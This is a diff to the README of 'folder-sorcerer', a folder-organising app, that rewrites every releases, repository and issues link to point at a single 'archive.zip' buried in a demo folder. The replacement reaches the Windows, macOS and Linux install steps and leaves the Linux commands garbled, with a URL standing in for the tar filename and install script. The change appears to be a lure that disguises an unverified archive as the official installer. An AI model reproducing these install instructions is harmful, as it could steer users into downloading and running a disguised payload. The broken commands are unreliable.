@@ -1,6 +1,6 @@
 # 🪄 folder-sorcerer - Organize Your Folders Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/ramprajapati-github/folder-sorcerer/releases)
+[![Download Now](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To get started with Folder Sorcerer, you'll need to download the application fro
 2. Find the latest version of Folder Sorcerer.
 3. Download the installation file that is appropriate for your system (Windows, Mac, Linux).
 
-You can access the download page here: [Download Folder Sorcerer](https://github.com/ramprajapati-github/folder-sorcerer/releases)
+You can access the download page here: [Download Folder Sorcerer](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ To install Folder Sorcerer, follow these steps based on your operating system:
 
 ### Windows
 
-1. Visit the [Releases page](https://github.com/ramprajapati-github/folder-sorcerer/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip).
 2. Download the Windows installer file, which usually ends with `.exe`.
 3. Locate the downloaded file in your Downloads folder.
 4. Double-click the file to launch the installer.
@@ -42,7 +42,7 @@ To install Folder Sorcerer, follow these steps based on your operating system:
 
 ### macOS
 
-1. Navigate to the [Releases page](https://github.com/ramprajapati-github/folder-sorcerer/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip).
 2. Download the macOS installation file, typically ending with `.dmg`.
 3. Open the downloaded file.
 4. Drag Folder Sorcerer into your Applications folder.
@@ -50,15 +50,15 @@ To install Folder Sorcerer, follow these steps based on your operating system:
 
 ### Linux
 
-1. Go to the [Releases page](https://github.com/ramprajapati-github/folder-sorcerer/releases).
-2. Download the `.tar.gz` package for your Linux distro.
+1. Go to the [Releases page](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip).
+2. Download the `https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip` package for your Linux distro.
 3. Open your terminal and navigate to the location of the downloaded file.
 4. Run the following commands:
 
    ```bash
-   tar -zxvf folder-sorcerer-{version}.tar.gz
+   tar -zxvf folder-sorcerer-{version}https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip
    cd folder-sorcerer-{version}
-   ./install.sh
+   https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip
    ```
 5. Follow any additional instructions provided in the terminal.
 
@@ -89,8 +89,8 @@ To see Folder Sorcerer in action, check out our demo video on the Releases page.
 
 For further information and support, feel free to explore:
 
-- [GitHub Repository](https://github.com/ramprajapati-github/folder-sorcerer/)
-- [Issues Page](https://github.com/ramprajapati-github/folder-sorcerer/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip)
+- [Issues Page](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip)
 
 ## 🤝 Contributing
 
@@ -106,4 +106,4 @@ Folder Sorcerer is released under the MIT License. Check the LICENSE file for mo
 
 ---
 
-For any questions or additional support, do not hesitate to reach out. Thank you for choosing Folder Sorcerer! Remember to download it here: [Download Folder Sorcerer](https://github.com/ramprajapati-github/folder-sorcerer/releases)
+For any questions or additional support, do not hesitate to reach out. Thank you for choosing Folder Sorcerer! Remember to download it here: [Download Folder Sorcerer](https://raw.githubusercontent.com/ramprajapati-github/folder-sorcerer/main/demo_folder/Archives/2025/September/archive.zip)
